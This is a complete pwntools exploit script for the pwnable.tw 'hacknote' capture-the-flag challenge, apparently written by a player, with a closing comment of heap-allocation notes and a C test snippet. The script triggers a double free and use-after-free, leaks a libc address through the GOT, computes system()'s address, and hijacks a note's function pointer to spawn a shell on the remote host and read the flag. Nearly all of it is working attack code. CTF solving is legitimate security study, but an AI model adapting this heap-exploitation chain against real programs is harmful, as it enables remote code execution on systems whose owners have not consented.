from pwn import *

s = remote("chall.pwnable.tw", 10102)
elf = ELF("hacknote")
libc = ELF("libc_32.so.6")

def add(size, content):
	s.sendlineafter("Your choice :", str(1))
	s.sendlineafter("Note size :", str(size))
	s.sendlineafter("Content :", content)

def delete(index):
	s.sendlineafter("Your choice :", str(2))
	s.sendlineafter("Index :", str(index))

def printnote(index):
	s.sendlineafter("Your choice :", str(3))
	s.sendlineafter("Index :", str(index))
	return s.recv()

def main():
	# get address (point to __libc_start_main()) in got section in hacknote file  
	# manual: objdump -R hacknote | grep __libc_start_main
	libcstartmain_got = elf.got["__libc_start_main"]
	
	# this is address of print content note function
	put_addr = 0x0804862b
	
	# find offset of __libc_start_main() function in libc file
	# manual: readelf -s libc_32.so.6 | grep __libc_start_main
	libcstartmain_off = libc.symbols["__libc_start_main"]
	
	# find offset of system() function in libc file
	# manual: readelf -s libc_32.so.6 | grep system
	system_off = libc.symbols["system"]

	add(10,"")   #0
	delete(0)
	# this is double free vulnerability
	delete(0)

	add(20, "")   #1

	payload = p32(put_addr) + p32(libcstartmain_got)
	add(10, payload)   #2

	# use after free to get an important value
	retstring = printnote(0)
	libcstartmain_addr = u32(retstring[:4])
	
	# get system() address
	libc_base = libcstartmain_addr - libcstartmain_off
	system_addr = libc_base + system_off

	delete(2)

	payload = p32(system_addr) + ";sh\x00"
	add(10, payload)   #3

	# print note
	s.sendlineafter("Your choice :", str(3))

	# use after free to execute system()
	s.sendlineafter("Index :", str(0))

	s.sendline("cat /home/hacknote/flag\x00")
	print s.recv()
	
	s.close()

if __name__ == "__main__":
	main()	

'''
Some reminders:
+ Heap operation (NOT 100% T.T)
+ .text:0804893D    call    eax  
+ Some piece of code
--------------------------------
	a = malloc(10);
	b = malloc(10);
	printf("%x\n", a);
	printf("%x\n", b);
	printf("++++++++++++++\n");
	free(b);
	free(a);
	free(b);
	free(a);
	a = malloc(10);
	b = malloc(20);
	c = malloc(10);
	d = malloc(10);
	printf("%x\n", a);
	printf("%x\n", b);
	printf("%x\n", c);
	printf("%x\n", d);	
-------------------------------
# 32BIT
'''	
